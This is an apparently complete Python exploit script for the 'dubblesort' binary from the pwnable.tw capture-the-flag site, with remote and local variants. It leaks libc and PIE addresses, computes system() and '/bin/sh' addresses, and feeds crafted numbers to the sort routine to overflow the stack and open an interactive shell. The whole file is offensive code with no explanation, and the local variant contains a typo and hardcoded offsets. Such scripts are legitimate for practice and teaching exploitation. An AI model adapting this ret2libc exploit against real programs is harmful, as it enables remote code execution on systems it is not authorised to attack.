#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./dubblesort')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10101)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
b *main+310
continue
'''.format(**locals())

# -- Exploit goes here --

def remote():
    re()
    payload="A"*24
    sl(payload)
    reu(payload)
    libc.address = uu64(ren(4))-0x1b000a
    ren(4)
    exe.address = uu64(ren(4))-0x601
    log.info(f"libc base : {hex(libc.address)}")
    log.info(f"PIE base : {hex(exe.address)}")
    system = libc.address + 0x3a940
    binsh = libc.address + 0x158e8b
    re()
    sl("49")
    for i in range(12-3):
        sla(": " , str(0x4000))
    sla(": ", str(system-1))
    sla(": ", str(system))
    sla(": ", str(system))
    sla(": ", str(system))
    sla(": ", str(system))
    sla(": ", str(system))
    sla(": ", str(system))
    for i in range(4):
        sla(": " , str(binsh))
    sl("A")

def local():
    sl("A"*0x10)
    reu("AAAAAAAAAAAAAAAA")
    libc.address = uu64(ren(4))-0x9080a+0x1000
    log.info(f"libc base : {hex(libc.address)}")
    lmao = libc.address + 0x1227f6
    shots = 44+4
    binsh=libc.address + 0x158e8b
    one_gad = libc.address+0x5f065
    # libc_got = libc.address+0x1afd08
    gdb,attach(io.pid, gdbscript=gdbscript)
    binsh = libc.address+0x158e8b
    sla("s do you what to sort :", str(shots))
    sla(': ', str(libc.address+0x158e8b)) #rip
    sla(': ', str(libc.address+0x00000000023f97)) # pop_rax
    sla(': ', str(libc.address+0x3a940))
    sla(': ', str(libc.address+0x00000000017828)) # pop esi
    sla(': ', str(libc.address+0x00000000017828))
    sla(': ', str(binsh))
    sla(': ', str(binsh))
    sla(': ', str(binsh))
    sla(': ', str(0x9000))
    sla(': ', str(0x9000))
    sla(': ', str(0x9000))
    sla(': ', str(0x0))
    sla(': ', str(0x0))
    sla(': ', str(0x0))
    sla(": ", str(libc.address+0x1b0040))
    i=6
    while True:
        if b"24" in re():
            sl("A")
            break
        else:
            sl(str(0x9000))

libc = ELF("./libc.so.6")
io = start()
# remote()
local()
reu("Processing......\n")
rl()
leak=re().split(b" ")
for i in range(len(leak)):
    try:
        log.info(f"{i} : {hex(int(leak[i]))}")
    except:
        break
io.interactive()